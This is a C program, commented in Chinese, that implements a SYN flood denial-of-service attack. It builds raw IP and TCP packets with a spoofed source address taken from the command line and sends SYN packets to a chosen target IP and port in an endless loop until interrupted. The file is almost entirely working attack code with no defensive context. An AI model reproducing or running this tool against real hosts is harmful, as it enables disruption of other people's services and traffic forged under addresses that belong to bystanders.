#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
unsigned short DoS_cksum (unsigned short *ptr, int nbytes);
int syn ();
void stopsyn (int signo);
struct sockaddr_in target;	/* 目的地址 */
struct sockaddr_in pesudo;	/* 伪造的源地址 */
int rawsock;
/* CRC16循环冗余校验函数 */
unsigned short
DoS_cksum (unsigned short *addr, int len)
{
  int sum = 0;
  unsigned short res = 0;
  /* 计算偶数字节 */
  while (len > 1)
    {
      sum += *addr++;
      len -= 2;
    }
  /* 如果为奇数,将最后一个字节单独计算 
   *     *   剩余的一个字节为高字节构建一个short类型变量值 
   *         */
  if (len == 1)
    {
      *((unsigned char *) (&res)) = *((unsigned char *) addr);
      sum += res;
    }
  /* 折叠 */
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  /* 取反 */
  res = ~sum;
  return res;
}

/* 信号处理函数,设置程序退出 */
void
stopsyn (int signo)
{
  printf ("程序终止!\n");
  close (rawsock);
  exit (0);
}

int
main (int argc, char *argv[])
{
  if (argc != 4)
    {
      printf
	("请输入伪造IP地址，目标IP地址，目标端口号！\n");
      exit (1);
    }
  if (inet_aton (argv[1], &pesudo.sin_addr) == 0)
    {
      printf ("伪造IP地址不正确！\n");
      exit (1);
    }
  if (inet_aton (argv[2], &target.sin_addr) == 0)
    {
      printf ("目的IP地址不正确！\n");
      exit (1);
    }
  target.sin_port = htons (atoi (argv[3]));
  /* 信号处理函数 */
  signal (SIGINT, stopsyn);
  syn ();
  exit (0);
}

/* SYN DoS攻击实现函数 */
int
syn ()
{
  /* 报文结构体packet_t，分为IP头部ip、TCP报文头部tcp，数据稍后填充 */
  struct packet_t
  {
    struct iphdr ip;
    struct tcphdr tcp;
  } packet;
  /* 结构体pseudo_h，伪造头 */
  struct pseudo_h
  {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
  } pseudo_h;
  bzero (&packet, sizeof (packet));
  bzero (&pseudo_h, sizeof (pseudo_h));
  /* 原始套接字SOCK_RAW */
  if ((rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror ("socket()");
      exit (1);
    }
  packet.tcp.dest = target.sin_port;	/* 16位端口 */
  packet.tcp.ack_seq = 0;	/* 32位的确认号 */
  packet.tcp.doff = 5;		/* 数据偏移 */
  packet.tcp.res1 = 0;		/* 保留字段 */
  packet.tcp.urg = 0;		/* 紧急偏移有效标志 */
  packet.tcp.ack = 0;		/* 确认字段有效标志 */
  packet.tcp.psh = 0;		/* Push 标志 */
  packet.tcp.rst = 0;		/* Reset 标志 */
  packet.tcp.syn = 1;		/* 同步序号标志 */
  packet.tcp.fin = 0;		/* 终止发送标志 */
  packet.tcp.window = htons (242);	/* 16位窗口 */
  packet.tcp.urg_ptr = 0;	/* 16位紧急指针 */
  packet.ip.version = 4;	/* 4位版本号 */
  packet.ip.ihl = 5;		/* 4位头长度 */
  packet.ip.tos = 0;		/* 8位区分长度 */
  packet.ip.tot_len = htons (40);	/* 16位总长度 */
  packet.ip.id = getpid ();	/* 16位ID标识 */
  packet.ip.frag_off = 0;	/* 13位片偏移 */
  packet.ip.ttl = 255;		/* 8位生存时间 */
  packet.ip.protocol = IPPROTO_TCP;	/* 8位协议标示 */
  packet.ip.check = 0;		/* 16位校验和,先填写为0 */
  packet.ip.saddr = pesudo.sin_addr.s_addr;	/* 32位源地址 */
  packet.ip.daddr = target.sin_addr.s_addr;	/* 32位目的地址 */
  packet.ip.check = DoS_cksum ((unsigned short *) &packet.ip, 20);	/* 计算IP报文校验和 */
  while (1)
    {
      /* 设置随机伪造源地址，随机序号 */
      packet.tcp.source = htons (1025 + rand () % 60000);
      packet.tcp.seq = 761013 + rand () % 100000;
      packet.tcp.check = 0;	/* 校验和,先填写为0 */
      /* 填充伪造头 */
      pseudo_h.source_address = packet.ip.saddr;
      pseudo_h.dest_address = packet.ip.daddr;
      pseudo_h.placeholder = 0;
      pseudo_h.protocol = IPPROTO_TCP;
      pseudo_h.tcp_length = htons (20);
      /* 填充伪造头到packet_t结构体 */
      bcopy ((char *) &packet.tcp, (char *) &pseudo_h.tcp, 20);
      packet.tcp.check = DoS_cksum ((unsigned short *) &pseudo_h, 32);	/* 计算TCP报文校验和 */
      /* 攻击开始 */
      sendto (rawsock, &packet, 40, 0, (struct sockaddr *) &target,
	      sizeof (target));
    }
  return 0;
}
